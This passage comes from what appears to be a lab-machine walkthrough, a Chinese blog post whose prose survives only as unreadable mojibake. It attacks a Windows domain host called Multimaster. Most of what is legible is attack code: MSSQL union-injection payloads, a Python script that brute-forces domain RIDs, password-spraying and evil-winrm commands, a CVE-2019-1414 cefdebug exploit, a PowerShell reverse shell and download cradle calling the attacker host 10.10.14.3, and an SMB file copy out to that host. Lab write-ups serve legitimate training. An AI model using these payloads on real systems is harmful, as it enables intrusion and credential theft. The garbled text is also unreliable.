åï¼Œåˆ©ç”¨<code>burpsuite</code>å‘é€ä»ç„¶æœ‰æ•ˆï¼Œæ•°æ®æ˜¾ç¤ºåœ¨é˜¿<code>email</code>ä½ç½®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ç»§ç»­æ“ä½œäº†</p><h2 id="è·å–é»˜è®¤åŸŸ"><a href="#è·å–é»˜è®¤åŸŸ" class="headerlink" title="è·å–é»˜è®¤åŸŸ"></a>è·å–é»˜è®¤åŸŸ</h2><p>ç¬¬ä¸€æ­¥å°±æ˜¯è¦è·å–åŸŸçš„åç§°ï¼Œåˆ©ç”¨<code>default_domain()</code>å‡½æ•°è·å–åŸŸå</p><p><code>a &#39; union select 1,2,3,(select default_domain()),5 --</code></p><p>å°†<code>payload</code>ç¼–ç åå‘é€</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724184629285-1312604411.png" alt="image-20240724184624729"></p><p>å¯ä»¥è·å¾—åŸŸå<code>MEGACORP</code></p><h2 id="è·å–åŸŸçš„-SID"><a href="#è·å–åŸŸçš„-SID" class="headerlink" title="è·å–åŸŸçš„ SID"></a>è·å–åŸŸçš„ SID</h2><p>çŸ¥é“åŸŸååï¼Œå¯ä»¥ä½¿ç”¨ä¸€è‡´çš„å†…ç½®è´¦æˆ·æˆ–ç»„ï¼ˆå¦‚ï¼š<code>Administrator</code>è´¦æˆ·ï¼‰æ³¨å…¥è·å–<code>SID</code>å€¼ï¼Œåœ¨æ— ç±»å‹è½¬æ¢çš„æƒ…å†µä¸‹ä¼šè¿”å›ä¸€ä¸ªäºŒè¿›åˆ¶æ•°æ®ï¼Œä¸åˆ©äºæˆ‘ä»¬è¯»å–ï¼Œæ‰€ä»¥ä½¿ç”¨<code>sys.fn_varbintohexstr</code>å°†å…¶åŒ…è£…èµ·æ¥ï¼Œä½¿å…¶èƒ½å¤Ÿåœ¨<code>http</code>ä¸­ç›´è§‚åœ°çœ‹å‡ºæ•°æ®</p><blockquote><p><code>sys.fn_varbintohexstr</code> æ˜¯ Microsoft SQL Server ä¸­çš„ä¸€ä¸ªç³»ç»Ÿå‡½æ•°ã€‚å®ƒç”¨äºå°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤º</p></blockquote><p><code>a &#39; union select 1,2,3,(select sys.fn_varbintohexstr(SUSER_SID(&#39;MEGACORP\Administrator&#39;))),5 --</code></p><p>å°†<code>payload</code>ç¼–ç åå‘é€</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724185434633-319141801.png" alt="image-20240724185429811"></p><p>è¿™é‡Œå°±æ‹¿åˆ°äº†SID<code>çš„åå…­è¿›åˆ¶ï¼š</code>0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`</p><p>ä½†æ˜¯æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ª16è¿›åˆ¶æ•°æ®è½¬æ¢æˆ<code>SID</code>æ ¼å¼ï¼Œè¿™é‡Œåˆ©ç”¨<code>python</code>è„šæœ¬å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_sid</span>(<span class="params">hex_str</span>):</span><br><span class="line">    <span class="comment"># å»æ‰å‰ç¼€ &quot;0x&quot; å’Œå¯èƒ½çš„ç©ºæ ¼</span></span><br><span class="line">    hex_str = hex_str.replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    byte_array = <span class="built_in">bytearray</span>.fromhex(hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œå®ƒè¡¨ç¤ºç‰ˆæœ¬å·</span></span><br><span class="line">    revision = byte_array[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç¬¬äºŒä¸ªå­—èŠ‚è¡¨ç¤ºæ ‡è¯†ç¬¦æƒé™å€¼çš„é•¿åº¦</span></span><br><span class="line">    sub_authority_count = byte_array[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¥ä¸‹æ¥æ˜¯6ä¸ªå­—èŠ‚çš„æ ‡è¯†ç¬¦æƒé™å€¼</span></span><br><span class="line">    identifier_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">2</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‰©ä¸‹çš„å­—èŠ‚æ˜¯å­æˆæƒå€¼</span></span><br><span class="line">    sub_authorities = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sub_authority_count):</span><br><span class="line">        sub_authority = <span class="built_in">int</span>.from_bytes(byte_array[<span class="number">8</span> + i*<span class="number">4</span>: <span class="number">12</span> + i*<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        sub_authorities.append(sub_authority)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç»„è£…SIDå­—ç¬¦ä¸²</span></span><br><span class="line">    sid = <span class="string">f&quot;S-<span class="subst">&#123;revision&#125;</span>-<span class="subst">&#123;identifier_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        sid += <span class="string">f&quot;-<span class="subst">&#123;sub_authority&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sid</span><br><span class="line"></span><br><span class="line">hex_str = <span class="string">&quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000&quot;</span></span><br><span class="line">sid = hex_to_sid(hex_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SID: <span class="subst">&#123;sid&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190101967-1037261460.png" alt="image-20240724190057434"></p><p>æœ€åå°±è·å¾—äº†<code>SID</code>ï¼š<code>S-1-5-21-3167813660-1240564177-918740779-500</code></p><h2 id="æšä¸¾ç”¨æˆ·RID"><a href="#æšä¸¾ç”¨æˆ·RID" class="headerlink" title="æšä¸¾ç”¨æˆ·RID"></a>æšä¸¾ç”¨æˆ·RID</h2><p>ä¸Šä¸€æ­¥è·å–äº†<code>Administertor</code>çš„<code>SID</code>ï¼Œå¯ä»¥åˆ©ç”¨ä¹‹å‰æåˆ°è¿‡çš„<code>SUSER_SNAME()</code>å‡½æ•°éªŒè¯ä¸€ä¸‹</p><p><code>a &#39; union select 1,2,3,(select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)),5 --</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724190903604-191476298.png" alt="image-20240724190858542"></p><p>éªŒè¯æ²¡é—®é¢˜ï¼Œå¹¶ä¸”çŸ¥é“<code>Administertor</code>çš„<code>RID</code>æ˜¯<code>500</code></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡è¿™ä¸ª<code>RID</code>çš„å€¼æ¥çˆ†ç ´å…¶ä»–åŸŸç”¨æˆ·åï¼Œè¿™é‡Œä½¿ç”¨<code>python</code>è„šæœ¬æ¥å®ç°ï¼Œä½†æ˜¯è¦æ³¨æ„ä¸è¦è¯·æ±‚çš„å¤ªå¿«ï¼Œè¯·æ±‚å¤ªå¿«ä¼šè¢«<code>waf</code>æ‹¦æˆªï¼Œç”¨<code>sleep</code>å‡½æ•°æ¥è¾¾åˆ°å»¶æ—¶è®¿é—®çš„æ•ˆæœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># SIDè½¬16è¿›åˆ¶</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sid_to_hex</span>(<span class="params">sid_str</span>):</span><br><span class="line">    parts = sid_str[<span class="number">2</span>:].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    revision = <span class="built_in">int</span>(parts[<span class="number">0</span>])</span><br><span class="line">    identifier_authority = <span class="built_in">int</span>(parts[<span class="number">1</span>])</span><br><span class="line">    sub_authorities = [<span class="built_in">int</span>(part) <span class="keyword">for</span> part <span class="keyword">in</span> parts[<span class="number">2</span>:]]</span><br><span class="line">    hex_bytes = <span class="built_in">bytearray</span>([revision, <span class="built_in">len</span>(sub_authorities)])</span><br><span class="line">    hex_bytes.extend(identifier_authority.to_bytes(<span class="number">6</span>, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> sub_authority <span class="keyword">in</span> sub_authorities:</span><br><span class="line">        hex_bytes.extend(sub_authority.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + hex_bytes.<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># ç¼–ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_escape</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="string">r&quot;\u&#123;:04x&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=UTF-8&#x27;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://10.10.10.179/api/getColleagues&quot;</span></span><br><span class="line">sql = <span class="string">&quot;a&#x27; union select 1,2,3,(select SUSER_SNAME(&#123;&#125;)),5 --&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>,<span class="number">10000</span>):</span><br><span class="line">    sid = <span class="string">&quot;S-1-5-21-3167813660-1240564177-918740779-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    <span class="built_in">str</span> = sid_to_hex(sid)</span><br><span class="line">    payload = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;&#x27;</span>+unicode_escape(sql.<span class="built_in">format</span>(<span class="built_in">str</span>))+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    r = requests.post(url, data=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>] :</span><br><span class="line">        <span class="built_in">print</span>(json.loads(r.text)[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>])</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸Šè¿°è„šæœ¬ç­‰å¾…ä¸€ä¼šå„¿ï¼Œå°±å¯ä»¥å¾—åˆ°è¯¥åŸŸå†…å‡ ä¹å…¨éƒ¨çš„ç”¨æˆ·åï¼Œå°†ç”¨æˆ·åä¿å­˜åˆ°æ–‡ä»¶<code>users.txt</code>ä¸­ï¼Œé¡ºä¾¿æŠŠ<code>MEGACORP\</code>è¿‡æ»¤æ‰</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">Domain Admins</span><br><span class="line">Domain Users</span><br><span class="line">Domain Guests</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Cert Publishers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Group Policy Creator Owners</span><br><span class="line">Read-only Domain Controllers</span><br><span class="line">Cloneable Domain Controllers</span><br><span class="line">Protected Users</span><br><span class="line">Key Admins</span><br><span class="line">Enterprise Key Admins</span><br><span class="line">RAS and IAS Servers</span><br><span class="line">Allowed RODC Password Replication Group</span><br><span class="line">Denied RODC Password Replication Group</span><br><span class="line">MULTIMASTER$</span><br><span class="line">DnsAdmins</span><br><span class="line">DnsUpdateProxy</span><br><span class="line">svc-nas</span><br><span class="line">Privileged IT Accounts</span><br><span class="line">tushikikatomo</span><br><span class="line">andrew</span><br><span class="line">lana</span><br><span class="line">alice</span><br><span class="line">test</span><br><span class="line">dai</span><br><span class="line">svc-sql</span><br><span class="line">SQLServer2005SQLBrowserUser$MULTIMASTER</span><br><span class="line">sbauer</span><br><span class="line">okent</span><br><span class="line">ckane</span><br><span class="line">kpage</span><br><span class="line">james</span><br><span class="line">cyork</span><br><span class="line">rmartin</span><br><span class="line">zac</span><br><span class="line">jorden</span><br><span class="line">alyx</span><br><span class="line">ilee</span><br><span class="line">nbourne</span><br><span class="line">zpowers</span><br><span class="line">aldom</span><br><span class="line">jsmmons</span><br><span class="line">pmartin</span><br><span class="line">Developers</span><br></pre></td></tr></table></figure><h2 id="äºŒæ¬¡å¯†ç å–·æ´’ç™»å½•tushikikatomo"><a href="#äºŒæ¬¡å¯†ç å–·æ´’ç™»å½•tushikikatomo" class="headerlink" title="äºŒæ¬¡å¯†ç å–·æ´’ç™»å½•tushikikatomo"></a>äºŒæ¬¡å¯†ç å–·æ´’ç™»å½•tushikikatomo</h2><p>ç”¨åˆšå¾—åˆ°çš„ç”¨æˆ·åä»¥åŠå¯†ç è¿›è¡Œå¯†ç å–·æ´’</p><p><code>crackmapexec smb 10.10.10.179 -u users.txt -p passwds</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212704923-13932621.png" alt="image-20240724212700281"></p><p>æœ€åä¹Ÿæ˜¯åœ¨æ¼«é•¿çš„ç­‰å¾…ä¸­ï¼Œæ‰¾åˆ°äº†æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œåœ¨æŸ¥çœ‹ä¸€ä¸‹èƒ½å¦<code>winrm</code>ç™»å½•</p><p><code>crackmapexec winrm 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724212837921-732608447.png" alt="image-20240724212832989"></p><p>å¯ä»¥ç™»å½•ï¼Œç›´æ¥ç™»å½•è¯¥ç”¨æˆ·</p><p><code>evil-winrm -i 10.10.10.179 -u tushikikatomo -p finance1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213111085-1525432495.png" alt="image-20240724213106549"></p><p>ç™»é™†æˆåŠŸ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240724213155442-1793569265.png" alt="image-20240724213150692"></p><p>æœ€ååœ¨<code>Desktop</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>user.txt</code></p><h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><h2 id="bloodhoundä¿¡æ¯æœé›†"><a href="#bloodhoundä¿¡æ¯æœé›†" class="headerlink" title="bloodhoundä¿¡æ¯æœé›†"></a>bloodhoundä¿¡æ¯æœé›†</h2><p>å…ˆä½¿ç”¨<code>bloodhound</code>è¿›è¡Œä¿¡æ¯æœé›†ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æœ‰æœ‰ä»·å€¼çš„ä¿¡æ¯</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725102932070-1881559902.png" alt="image-20240725102923819"></p><p>å‘ç°è¿˜æœ‰å¾ˆå¤šå…¶ä»–ç”¨æˆ·ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°ä»€ä¹ˆå…¶ä»–ä¿¡æ¯</p><p>è¿˜æ˜¯å»ç¿»ç¿»æ–‡ä»¶å¤¹å§</p><p>ä¹Ÿæ˜¯ç¿»äº†å¥½ä¹…ï¼Œæœ€ååœ¨<code>Program Files</code>æ–‡ä»¶å¤¹ä¸­ï¼Œå‘ç°ä¸€å †åº”ç”¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725111221575-575415943.png" alt="image-20240725111210668"></p><p>å†çœ‹ä¸‹è¿›ç¨‹çœ‹çœ‹é‚£äº›åº”ç”¨åœ¨è¿è¡Œ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240725112503342-1413852341.png" alt="image-20240725112455699"></p><p>å‘ç°åœ¨æœ€ä¸Šé¢è¿è¡Œç€ä¸€å †<code>Code</code>è¿›ç¨‹ï¼ŒçŒœæµ‹è·Ÿ<code>VSCode</code>åº”ç”¨æœ‰å…³ï¼Œç¡®è®¤ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726103348474-1758824233.png" alt="image-20240726103345887"></p><p>å‘ç°ç¡®å®æ˜¯è¯¥åº”ç”¨ï¼Œçœ‹çœ‹è¯¥åº”ç”¨çš„ç‰ˆæœ¬</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240726104232227-713737.png" alt="image-20240726104229382"></p><p>åœ¨<code>C:\Program Files\Microsoft VS Code\resources\app</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>package.json</code></p><p>åœ¨ç½‘ä¸Šæœç´¢è¯¥ç‰ˆæœ¬æ˜¯å¦æœ‰æ¼æ´ï¼Œå‘ç°å¦‚ä¸‹ç»“æœ</p><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414">CVE-2019-1414</a></li></ul><h2 id="CVE-2019-1414ç™»å½•cyork"><a href="#CVE-2019-1414ç™»å½•cyork" class="headerlink" title="CVE-2019-1414ç™»å½•cyork"></a>CVE-2019-1414ç™»å½•cyork</h2><blockquote><p>å½“ Visual Studio Code å‘æœ¬åœ°è®¡ç®—æœºçš„ç”¨æˆ·å…¬å¼€è°ƒè¯•ä¾¦å¬å™¨æ—¶ï¼Œå®ƒä¼šå­˜åœ¨ç‰¹æƒæå‡æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æœ¬åœ°æ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„ä»£ç ä»¥åœ¨å½“å‰ç”¨æˆ·çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚å¦‚æœå½“å‰ç”¨æˆ·ä½¿ç”¨ç®¡ç†ç”¨æˆ·æƒé™ç™»å½•ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å½±å“çš„ç³»ç»Ÿã€‚<br><a href="https://iwantmore.pizza/posts/cve-2019-1414.html">è¯¦ç»†åˆ©ç”¨æ–¹æ³•</a></p></blockquote><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/taviso/cefdebug">cefdebug</a>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´</p><p>å…ˆå°†å·¥å…·ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå†å°†<code>cefdebug.exe</code>ä¼ åˆ°æœºå™¨ä¸Š</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093323214-1165219866.png" alt="image-20240729093308415"></p><p>è¿è¡Œè¯¥æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093355745-1571258238.png" alt="image-20240729093341288"></p><p>æ‰«ææœ¬åœ°æœºå™¨å¹¶æˆåŠŸè·å¾—äº†ä¸‰ä¸ª <code>CEF</code> è°ƒè¯•å™¨ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªé€šè¿‡ä»£ç æ¥éªŒè¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cefdebug.exe --url ws://127.0.0.1:22048/43667936-2666-4f67-898b-5d4a75cd2f4a --code <span class="string">&quot;process.version&quot;</span> </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093416362-1657600438.png" alt="image-20240729093401071"></p><p>éªŒè¯æˆåŠŸï¼Œå‘ç°å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å–ä¸€ä¸ª<code>shell</code></p><p>æ‹¿ä¸‹é¢çš„<code>powershell</code>å‘½ä»¤åå¼¹<code>shell</code>ï¼Œå…ˆå°†è¯¥å‘½ä»¤ä¿å­˜ä¸º<code>shell.ps1</code>è‡³æœ¬åœ°</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ip</span> = <span class="string">&quot;10.10.14.3&quot;</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">8888</span></span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="variable">$ip</span>, <span class="variable">$port</span>)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream()</span><br><span class="line"><span class="variable">$writer</span> = <span class="built_in">New-Object</span> System.IO.StreamWriter(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$reader</span> = <span class="built_in">New-Object</span> System.IO.StreamReader(<span class="variable">$stream</span>)</span><br><span class="line"><span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="number">1024</span></span><br><span class="line"><span class="variable">$writer</span>.WriteLine(<span class="string">&quot;Shell connected!&quot;</span>)</span><br><span class="line"><span class="variable">$writer</span>.Flush()</span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$input</span> = <span class="variable">$reader</span>.ReadLine()) <span class="operator">-ne</span> <span class="string">&quot;exit&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$output</span> = (<span class="built_in">Invoke-Expression</span> <span class="variable">$input</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span>)</span><br><span class="line">    <span class="variable">$writer</span>.WriteLine(<span class="variable">$output</span>)</span><br><span class="line">    <span class="variable">$writer</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>åœ¨<code>kali</code>å¼€å¯ç›‘å¬ï¼ŒåŒæ—¶å¼€å¯<code>http</code>æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨<code>cefdebug.exe</code>è¿è¡Œ <code>CEF</code> è°ƒè¯•å™¨çš„æœåŠ¡å™¨æ‰§è¡Œåå¼¹ <code>shell</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\cefdebug.exe <span class="literal">--url</span> ws://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">22048</span>/<span class="number">43667936</span><span class="literal">-2666-4f67-898b-5d4a75cd2f4a</span> <span class="literal">--code</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;powershell IEX(New-Object Net.WebClient).DownloadString(\&#x27;http://10.10.14.3/shell.ps1\&#x27;)&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤å°†æ–‡ä»¶ä¸‹è½½å¹¶æ‰§è¡Œè€Œä¸æ˜¯å°†æ–‡ä»¶ä¼ åˆ°æœºå™¨ä¸Šå¹¶æ‰§è¡Œï¼Œè¿™æ ·å°±ç»•è¿‡äº†æœ¬åœ°çš„è„šæœ¬æ‰§è¡Œç­–ç•¥</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093447413-368288370.png" alt="image-20240729093432988"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093520842-1996459293.png" alt="image-20240729093506601"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729093507850-881670073.png" alt="image-20240729093453671"></p><p>è¿™æ—¶æˆ‘ä»¬å°±æ‹¿åˆ°äº†<code>cyork</code>ç”¨æˆ·çš„æƒé™</p><h2 id="SMBä¼ è¾“æ•æ„Ÿæ–‡ä»¶"><a href="#SMBä¼ è¾“æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="SMBä¼ è¾“æ•æ„Ÿæ–‡ä»¶"></a>SMBä¼ è¾“æ•æ„Ÿæ–‡ä»¶</h2><p>æµ‹è¯•åå‘ç°<code>cyork</code>ç”¨æˆ·å¯ä»¥è®¿é—® <code>C:\inetpub\wwwroot\bin</code>ç›®å½•ï¼Œä¹‹å‰çš„ç”¨æˆ·è®¿é—®æ˜¯ä¸è¡Œçš„</p><p>åœ¨è¿™é‡Œå‘ç°äº†ä¸€äº›<code>dll</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729094451423-1978565072.png" alt="image-20240729094436832"></p><p>è¿™é‡Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ªåä¸º<code>MultimasterAPI.dll</code>çš„<code>DLL</code> </p><p>å°è¯•åˆ©ç”¨<code>SMB</code>å…±äº«å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p>é¦–å…ˆä½¿ç”¨ <code>smbserver.py</code>å»ºç«‹ä¸€ä¸ªå…±äº«æœåŠ¡å™¨</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729100527970-1961370175.png" alt="image-20240729100513542"></p><p>åœ¨é¶æœºä¸Šæ‰§è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\10.10.14.3\share</span><br><span class="line">copy MultimasterAPI.dll x:</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104103094-1081529091.png" alt="image-20240729104048727"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104200842-1329366775.png" alt="image-20240729104143310"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240729104217347-1563767963.png" 